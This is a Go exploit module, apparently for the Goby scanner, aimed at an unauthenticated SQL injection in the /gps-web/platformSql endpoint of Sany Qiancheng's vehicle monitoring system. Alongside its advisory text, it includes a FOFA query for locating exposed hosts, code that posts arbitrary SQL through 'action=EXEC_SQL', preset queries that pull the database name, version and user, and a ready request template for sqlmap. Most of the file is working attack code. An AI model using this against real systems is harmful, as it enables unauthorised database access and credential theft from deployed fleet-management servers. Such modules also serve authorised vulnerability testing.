package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Sany Qiancheng vehicle monitoring integrated management system /platformSql SQL Injection Vulnerability",
    "Description": "<p>As an important product in the field of Internet of Vehicles, the vehicle monitoring integrated management system of Sany Qiancheng Technology Co., Ltd. is widely used in various vehicle management scenarios with its comprehensive, efficient and intelligent characteristics. It is a one-stop solution designed for vehicle monitoring and management based on advanced Internet of Things, big data, cloud computing and other technologies. The system can realize real-time monitoring, data analysis, abnormal alarm, remote scheduling and other functions of the vehicle, helping users improve vehicle operation efficiency, reduce operating costs, and ensure driving safety. </p><p>Because the /gps-web/platformSql interface of Sany Qiancheng Vehicle Monitoring Integrated Management System does not do any access control and input verification or filtering, unauthenticated remote attackers can use this interface to execute arbitrary SQL statements, obtain the administrator account password, cause information leakage, and may also obtain server permissions for in-depth exploitation.</p>",
    "Product": "Sany Qiancheng vehicle monitoring integrated management system",
    "Homepage": "https://www.31gps.net/",
    "DisclosureDate": "2024-09-06",
    "PostTime": "2024-10-23",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"欢迎光临...\" && body=\"/gps-web\"",
    "GobyQuery": "title==\"欢迎光临...\" && body=\"/gps-web\"",
    "Level": "1",
    "Impact": "<p>Because the /gps-web/platformSql interface of Sany Qiancheng Vehicle Monitoring Integrated Management System does not do any access control and input verification or filtering, unauthenticated remote attackers can use this interface to execute arbitrary SQL statements, obtain the administrator account password, cause information leakage, and may also obtain server permissions for in-depth exploitation.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/141284051"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT VERSION()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "三一谦成车辆监控综合管理系统 /platformSql SQL 注入漏洞",
            "Product": "三一谦成车辆监控综合管理系统",
            "Description": "<p>三一谦成科技有限公司的车辆监控综合管理系统，作为车联网领域的重要产品，以其全面、高效、智能的特点，广泛应用于各类车辆管理场景。是基于先进的物联网、大数据、云计算等技术，专为车辆监控与管理设计的一站式解决方案。该系统能够实现对车辆的实时监控、数据分析、异常报警、远程调度等功能，帮助用户提升车辆运营效率，降低运营成本，保障行车安全。<br></p><p>由于三一谦成车辆监控综合管理系统 /gps-web/platformSql 接口未做任何访问控制和输入校验或过滤，导致未经身份验证的远程攻击者可利用此接口执行任意SQL语句，获取管理员账号密码造成信息泄露，深入利用还可能获取服务器权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>由于三一谦成车辆监控综合管理系统&nbsp;/gps-web/platformSql 接口未做任何访问控制和输入校验或过滤，导致未经身份验证的远程攻击者可利用此接口执行任意SQL语句，获取管理员账号密码造成信息泄露，深入利用还可能获取服务器权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Sany Qiancheng vehicle monitoring integrated management system /platformSql SQL Injection Vulnerability",
            "Product": "Sany Qiancheng vehicle monitoring integrated management system",
            "Description": "<p>As an important product in the field of Internet of Vehicles, the vehicle monitoring integrated management system of Sany Qiancheng Technology Co., Ltd. is widely used in various vehicle management scenarios with its comprehensive, efficient and intelligent characteristics. It is a one-stop solution designed for vehicle monitoring and management based on advanced Internet of Things, big data, cloud computing and other technologies. The system can realize real-time monitoring, data analysis, abnormal alarm, remote scheduling and other functions of the vehicle, helping users improve vehicle operation efficiency, reduce operating costs, and ensure driving safety.&nbsp;</p><p>Because the /gps-web/platformSql interface of Sany Qiancheng Vehicle Monitoring Integrated Management System does not do any access control and input verification or filtering, unauthenticated remote attackers can use this interface to execute arbitrary SQL statements, obtain the administrator account password, cause information leakage, and may also obtain server permissions for in-depth exploitation.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Because the /gps-web/platformSql interface of Sany Qiancheng Vehicle Monitoring Integrated Management System does not do any access control and input verification or filtering, unauthenticated remote attackers can use this interface to execute arbitrary SQL statements, obtain the administrator account password, cause information leakage, and may also obtain server permissions for in-depth exploitation.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	setSqlPayloadHashasdfujniasyhuifyhuioasdfyhiousdyho6uftgy7iosdfghiosd7ughysduhgkusd := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			postRequest.Data = "action=EXEC_SQL&params=" + sql
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/gps-web/platformSql"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/gps-web/platformSql"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "c72decc0a16932f21ab2a090af1aa21d"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT MD5("aasfcacxaasdcaxas")`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `:((.|\n)*?):\\"((.|\n)*?)\\"}\]`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[3], nil
			}
			sendPayload := setSqlPayloadHashasdfujniasyhuifyhuioasdfyhiousdyho6uftgy7iosdfghiosd7ughysduhgkusd
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /gps-web/platformSql HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */* Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
action=EXEC_SQL&params=SELECT MD5("aasfcacxaasdcaxas")`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `:((.|\n)*?):\\"((.|\n)*?)\\"}\]`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[3], nil
			}
			sendPayload := setSqlPayloadHashasdfujniasyhuifyhuioasdfyhiousdyho6uftgy7iosdfghiosd7ughysduhgkusd
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT database()"
					} else if way == "db_version" {
						sql = "SELECT version()"
					} else if way == "user_name" {
						sql = "SELECT user()"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
